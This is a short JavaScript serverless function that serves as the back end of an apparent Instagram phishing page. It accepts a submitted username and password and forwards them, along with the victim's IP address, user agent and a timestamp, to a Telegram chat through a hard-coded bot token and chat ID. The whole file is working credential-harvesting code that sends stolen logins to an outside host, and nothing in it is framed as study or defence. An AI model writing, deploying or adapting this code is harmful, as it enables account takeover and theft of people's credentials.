exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  let body;
  try {
    body = JSON.parse(event.body);
  } catch (e) {
    return { statusCode: 400, body: 'Bad Request' };
  }

  const { username, password } = body;
  if (!username || !password) {
    return { statusCode: 400, body: 'Missing fields' };
  }

  const botToken = '8891374192:AAHPO0sSO8LHDXCeTJS9Rbf7AGzQgOy7EnI';
  const chatId = '6265529524';

  const ip = event.headers['x-forwarded-for'] || 'unknown';
  const ua = event.headers['user-agent'] || 'unknown';
  const time = new Date().toISOString();

  const text = `🔐 Instagram Login\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📱 UA: ${ua}\n⏰ Time: ${time}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
  } catch (err) {
    console.error('Telegram error:', err);
  }

  return {
    statusCode: 200,
    headers: { 'Access-Control-Allow-Origin': '*' },
    body: JSON.stringify({ ok: true })
  };
};
